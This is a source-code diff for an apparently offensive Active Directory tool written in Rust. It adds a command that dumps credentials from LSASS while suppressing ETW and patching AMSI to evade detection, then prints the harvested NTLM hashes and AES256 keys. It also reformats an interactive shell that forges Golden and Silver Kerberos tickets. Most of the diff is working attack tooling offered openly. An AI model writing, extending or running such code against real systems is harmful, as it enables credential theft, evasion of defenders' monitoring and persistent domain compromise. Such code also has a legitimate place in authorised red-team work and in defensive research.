@@ -3,9 +3,9 @@
 use crate::auth::Credentials;
 use crate::banner;
 use crate::{
-    AdcsAction, AzureAction, C2Action, Cli, CrackMode, DumpSource, ForgeAction, MoveAction,
-    OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique, SecretsAction,
-    ShellType,
+    AdcsAction, AzureAction, C2Action, Cli, CrackMode, DumpLsassMethod, DumpSource, ForgeAction,
+    MoveAction, OutputFormat, PluginAction, ReportFormat, ScanType, SccmAction, SccmTechnique,
+    SecretsAction, ShellType,
 };
 use colored::Colorize;
 use kerberos_asn1::Asn1Object;
@@ -199,9 +199,126 @@ pub async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-// cmd_doctor â€” Environment Diagnostics
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═════════════════════════════════════════════════════════════════════════════
+// cmd_dump_lsass — Evasive LSASS Credential Dump (BetterSafetyKatz)
+// ═════════════════════════════════════════════════════════════════════════════
+
+pub async fn cmd_dump_lsass(
+    _cli: &Cli,
+    output: Option<&str>,
+    method: DumpLsassMethod,
+    pid: Option<u32>,
+    suppress_etw: bool,
+) -> i32 {
+    banner::print_module_banner("LSASS DUMP");
+    println!(
+        "  {} Method: {}",
+        ">".bright_black(),
+        format!("{:?}", method).cyan()
+    );
+    if let Some(p) = pid {
+        println!(
+            "  {} PID: {}",
+            ">".bright_black(),
+            format!("{}", p).yellow()
+        );
+    } else {
+        println!(
+            "  {} PID: {} (auto-detect)",
+            ">".bright_black(),
+            "auto".cyan()
+        );
+    }
+    if let Some(o) = output {
+        println!("  {} Output: {}", ">".bright_black(), o.cyan());
+    } else {
+        println!(
+            "  {} Output: {} (memory only)",
+            ">".bright_black(),
+            "none".bright_black()
+        );
+    }
+    if suppress_etw {
+        println!("  {} ETW suppress: {}", ">".bright_black(), "yes".green());
+    } else {
+        println!("  {} ETW suppress: {}", ">".bright_black(), "no".yellow());
+    }
+
+    // Build config
+    let config = overthrone_core::postex::cred_dump::CredDumpConfig {
+        dump_path: output.map(|s| s.to_string()),
+        use_direct_read_fallback: matches!(method, DumpLsassMethod::Auto),
+        suppress_etw,
+        patch_amsi: true,
+        max_dump_size_mb: 4,
+        custom_pid: pid,
+    };
+
+    // Run the extraction
+    let result = match unsafe { overthrone_core::postex::cred_dump::extract_lsass_creds(&config) } {
+        Ok(r) => r,
+        Err(e) => {
+            banner::print_fail(&format!("LSASS dump failed: {}", e));
+            return 1;
+        }
+    };
+
+    // Print results
+    let has_creds = result.ntlm_count > 0 || result.aes256_count > 0;
+    if has_creds {
+        banner::print_success("LSASS dump completed");
+    } else if result.errors.is_empty() {
+        banner::print_fail("LSASS dump produced no credentials (LSASS may be PPL-protected)");
+        return 1;
+    } else {
+        banner::print_fail(&format!("LSASS dump failed: {}", result.errors.join("; ")));
+        return 1;
+    }
+
+    println!(
+        "  {} NTLM hashes: {}",
+        ">".bright_black(),
+        format!("{}", result.ntlm_count).green()
+    );
+    if result.aes256_count > 0 {
+        println!(
+            "  {} AES256 keys: {}",
+            ">".bright_black(),
+            format!("{}", result.aes256_count).cyan()
+        );
+    }
+    println!(
+        "  {} Method used: {}",
+        ">".bright_black(),
+        result.method.name().cyan()
+    );
+
+    for cred in &result.credentials {
+        let mut pieces = vec![];
+        if let Some(ref h) = cred.ntlm {
+            pieces.push(format!("ntlm:{}", h));
+        }
+        if let Some(ref k) = cred.aes256 {
+            pieces.push(format!("aes256:{}", k));
+        }
+        println!(
+            "  {} {}  {}",
+            "+".bright_green(),
+            cred.identity.cyan(),
+            pieces.join(" ").bright_black()
+        );
+    }
+
+    if wants_json(_cli) {
+        emit_json(_cli, serde_json::to_value(&result).unwrap_or_default());
+    }
+
+    0
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// cmd_doctor — Environment Diagnostics
+// ═════════════════════════════════════════════════════════════════════════════
 
 pub async fn _cmd_doctor(_cli: &Cli, checks: Vec<String>, dc: Option<&str>) -> i32 {
     banner::print_module_banner("DOCTOR");
@@ -955,7 +1072,16 @@ pub async fn cmd_forge(cli: &Cli, action: &ForgeAction) -> i32 {
             user,
             rid,
         } => {
-            return cmd_forge_shell(cli, &domain, domain_sid, krbtgt_hash, krbtgt_aes256.as_deref(), user.clone(), *rid).await;
+            return cmd_forge_shell(
+                cli,
+                &domain,
+                domain_sid,
+                krbtgt_hash,
+                krbtgt_aes256.as_deref(),
+                user.clone(),
+                *rid,
+            )
+            .await;
         }
         _ => run_forge_action(cli, &domain, action).await,
     }
@@ -994,6 +1120,9 @@ async fn run_forge_action(cli: &Cli, domain: &str, action: &ForgeAction) -> i32 
         skeleton_master_password: opts.get("master_password").cloned(),
         pkinit_cert_path: cli.pkinit_cert.clone(),
         pkinit_key_path: cli.pkinit_key.clone(),
+        pkinit_keyed_ticket: cli.pkinit_keyed_ticket,
+        pkinit_session_key: None,
+        pkinit_ticket_data: None,
         dry_run: cli.dry_run,
     };
 
@@ -1173,8 +1302,17 @@ async fn cmd_forge_shell(
     let mut krbtgt_hash = krbtgt_hash.to_string();
 
     banner::print_module_banner("FORGE SHELL");
-    println!("  {} Interactive forge REPL -- type 'help' for commands", ">".bright_black());
-    println!("  {} Context: {} @ {} (SID: {})", ">".bright_black(), user.cyan(), domain.cyan(), domain_sid.cyan());
+    println!(
+        "  {} Interactive forge REPL -- type 'help' for commands",
+        ">".bright_black()
+    );
+    println!(
+        "  {} Context: {} @ {} (SID: {})",
+        ">".bright_black(),
+        user.cyan(),
+        domain.cyan(),
+        domain_sid.cyan()
+    );
 
     fn print_help() {
         println!("  Commands:");
@@ -1264,33 +1402,48 @@ async fn cmd_forge_shell(
                         user = value.clone();
                         println!("  {} user set to {}", "+".green(), user.cyan());
                     }
-                    "rid" => {
-                        match value.parse::<u32>() {
-                            Ok(r) => {
-                                rid = r;
-                                println!("  {} rid set to {}", "+".green(), rid);
-                            }
-                            Err(_) => println!("  {} Invalid RID: {}", "!".red(), value),
+                    "rid" => match value.parse::<u32>() {
+                        Ok(r) => {
+                            rid = r;
+                            println!("  {} rid set to {}", "+".green(), rid);
                         }
-                    }
-                    _ => println!("  {} Unknown key: {}. Known: domain, domain_sid, krbtgt_hash, user, rid", "!".red(), key),
+                        Err(_) => println!("  {} Invalid RID: {}", "!".red(), value),
+                    },
+                    _ => println!(
+                        "  {} Unknown key: {}. Known: domain, domain_sid, krbtgt_hash, user, rid",
+                        "!".red(),
+                        key
+                    ),
                 }
             }
             "golden" => {
                 let g_user = flags.get("user").map_or(user.as_str(), |v| v.as_str());
-                let g_rid = flags.get("rid").and_then(|r| r.parse::<u32>().ok()).unwrap_or(rid);
+                let g_rid = flags
+                    .get("rid")
+                    .and_then(|r| r.parse::<u32>().ok())
+                    .unwrap_or(rid);
                 let out = outfile.unwrap_or_else(|| format!("golden_{}.kirbi", g_user));
 
                 let s_key = match hex::decode(&krbtgt_hash) {
                     Ok(k) if k.len() == 16 => k,
                     _ => {
-                        println!("  {} krbtgt_hash must be 32 hex chars (16 bytes, RC4)", "!".red());
+                        println!(
+                            "  {} krbtgt_hash must be 32 hex chars (16 bytes, RC4)",
+                            "!".red()
+                        );
                         continue;
                     }
                 };
 
                 println!("  {} Forging Golden Ticket...", ">".bright_black());
-                match overthrone_core::proto::kerberos::forge_tgt(&domain, &domain_sid, g_user, g_rid, &s_key, 23) {
+                match overthrone_core::proto::kerberos::forge_tgt(
+                    &domain,
+                    &domain_sid,
+                    g_user,
+                    g_rid,
+                    &s_key,
+                    23,
+                ) {
                     Ok(tgt) => {
                         let bytes = tgt.ticket.build();
                         if let Err(e) = std::fs::write(&out, &bytes) {
@@ -1304,25 +1457,44 @@ async fn cmd_forge_shell(
             }
             "silver" => {
                 if positional.is_empty() {
-                    println!("  {} Usage: silver <SPN> [--user U] [--rid N] [--out F] [--hash H]", ">".bright_black());
+                    println!(
+                        "  {} Usage: silver <SPN> [--user U] [--rid N] [--out F] [--hash H]",
+                        ">".bright_black()
+                    );
                     continue;
                 }
                 let spn = &positional[0];
                 let s_user = flags.get("user").map_or(user.as_str(), |v| v.as_str());
-                let s_rid = flags.get("rid").and_then(|r| r.parse::<u32>().ok()).unwrap_or(rid);
-                let hash_str = flags.get("hash").map_or(krbtgt_hash.as_str(), |v| v.as_str());
+                let s_rid = flags
+                    .get("rid")
+                    .and_then(|r| r.parse::<u32>().ok())
+                    .unwrap_or(rid);
+                let hash_str = flags
+                    .get("hash")
+                    .map_or(krbtgt_hash.as_str(), |v| v.as_str());
                 let out = outfile.unwrap_or_else(|| format!("silver_{}.kirbi", s_user));
 
                 let s_key = match hex::decode(hash_str) {
                     Ok(k) if k.len() == 16 => k,
                     _ => {
-                        println!("  {} Service hash must be 32 hex chars (16 bytes, RC4)", "!".red());
+                        println!(
+                            "  {} Service hash must be 32 hex chars (16 bytes, RC4)",
+                            "!".red()
+                        );
                         continue;
                     }
                 };
 
                 println!("  {} Forging Silver Ticket...", ">".bright_black());
-                match overthrone_core::proto::kerberos::forge_service_ticket(&domain, &domain_sid, s_user, s_rid, spn, &s_key, 23) {
+                match overthrone_core::proto::kerberos::forge_service_ticket(
+                    &domain,
+                    &domain_sid,
+                    s_user,
+                    s_rid,
+                    spn,
+                    &s_key,
+                    23,
+                ) {
                     Ok(tgs) => {
                         let bytes = tgs.ticket.build();
                         if let Err(e) = std::fs::write(&out, &bytes) {
@@ -1335,7 +1507,11 @@ async fn cmd_forge_shell(
                 }
             }
             _ => {
-                println!("  {} Unknown command: {}. Type 'help' for available commands.", "!".red(), cmd);
+                println!(
+                    "  {} Unknown command: {}. Type 'help' for available commands.",
+                    "!".red(),
+                    cmd
+                );
             }
         }
     }
